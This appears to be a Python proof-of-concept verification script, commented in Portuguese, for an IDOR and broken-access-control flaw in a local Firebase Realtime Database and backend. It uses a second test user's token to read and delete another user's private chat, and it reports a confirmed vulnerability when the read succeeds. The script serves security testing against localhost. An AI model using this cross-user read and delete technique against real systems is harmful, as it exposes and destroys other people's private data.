#!/usr/bin/env python3
"""
Teste de Verificação e Demonstração - VULN-01: Broken Access Control & IDOR
Verifica a vulnerabilidade de permissão permissiva no Realtime Database e autorização no Backend.
"""

import sys
import json
import requests
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent.parent
sys.path.append(str(BASE_DIR))

TOKENS_FILE = BASE_DIR / "scripts" / "pocs" / "test_tokens.json"
RTDB_URL = "http://localhost:9000"
BACKEND_URL = "http://localhost:5000"

def run_test():
    print("=" * 60)
    print("[TESTE VULN-01] Broken Access Control & IDOR Verification")
    print("=" * 60)

    if not TOKENS_FILE.exists():
        print(f"[-] Arquivo de tokens não encontrado em {TOKENS_FILE}. Execute o seed do Firebase primeiro.")
        return False

    with open(TOKENS_FILE, "r") as f:
        tokens = json.load(f)

    alice_uid = tokens["alice"]["uid"]
    alice_token = tokens["alice"].get("idToken") or tokens["alice"].get("id_token")
    bob_uid = tokens["bob"]["uid"]
    bob_token = tokens["bob"].get("idToken") or tokens["bob"].get("id_token")

    print(f"[+] Alice UID: {alice_uid}")
    print(f"[+] Bob UID:   {bob_uid}")

    # 1. Criação de um chat privado para a Alice
    chat_id = "secret-chat-alice-123"
    alice_chat_data = {
        "title": "Aconselhamento Academico Privado",
        "created_at": "2026-10-27T10:00:00Z",
        "messages": {
            "msg-01": {"sender": "Alice", "text": "Mensagem confidencial com notas e histórico."},
            "msg-02": {"sender": "Advisor", "text": "Seus dados foram atualizados com sucesso."}
        }
    }

    print("\n[Passo 1] Alice cria uma conversa confidencial no Realtime Database...")
    r_put = requests.put(
        f"{RTDB_URL}/users/{alice_uid}/chats/{chat_id}.json?auth={alice_token}",
        json=alice_chat_data,
        timeout=5
    )
    if r_put.status_code == 200:
        print("[+] Conversa da Alice criada com sucesso (HTTP 200).")
    else:
        print(f"[-] Falha ao criar conversa: {r_put.status_code} - {r_put.text}")
        return False

    # 2. Teste de Leitura Não Autorizada (IDOR): Bob tenta ler a conversa da Alice
    print("\n[Passo 2] Bob (usuário não autorizado) tenta ler os dados confidenciais da Alice...")
    r_idor_read = requests.get(
        f"{RTDB_URL}/users/{alice_uid}/chats/{chat_id}.json?auth={bob_token}",
        timeout=5
    )

    print(f"[*] Código retornado para Bob: {r_idor_read.status_code}")
    if r_idor_read.status_code == 200 and r_idor_read.json() is not None:
        print("\n[ALERTA DE VULNERABILIDADE DETECTADO] VULN-01 CONFIRMADA!")
        print(f"[!] Bob conseguiu ler o chat de Alice sem restrição:")
        print(json.dumps(r_idor_read.json(), indent=2, ensure_ascii=False))
        vulnerable = True
    elif r_idor_read.status_code == 401 or r_idor_read.status_code == 403:
        print("[+] Acesso negado com sucesso (Protegido por regras de segurança).")
        vulnerable = False
    else:
        print(f"[-] Resposta inesperada: {r_idor_read.status_code} - {r_idor_read.text}")
        vulnerable = False

    # 3. Teste de Exclusão Não Autorizada: Bob tenta deletar a conversa da Alice via Backend
    print("\n[Passo 3] Bob tenta deletar a conversa da Alice via DELETE /chats/<chat_id> no Backend...")
    try:
        r_del = requests.delete(
            f"{BACKEND_URL}/chats/{chat_id}",
            headers={"Authorization": f"Bearer {bob_token}"},
            timeout=5
        )
        print(f"[*] Resposta do Backend: {r_del.status_code} - {r_del.text}")
    except Exception as e:
        print(f"[*] Backend inacessível ou erro de conexão: {e}")

    return vulnerable

if __name__ == "__main__":
    is_vuln = run_test()
    sys.exit(0 if is_vuln else 1)
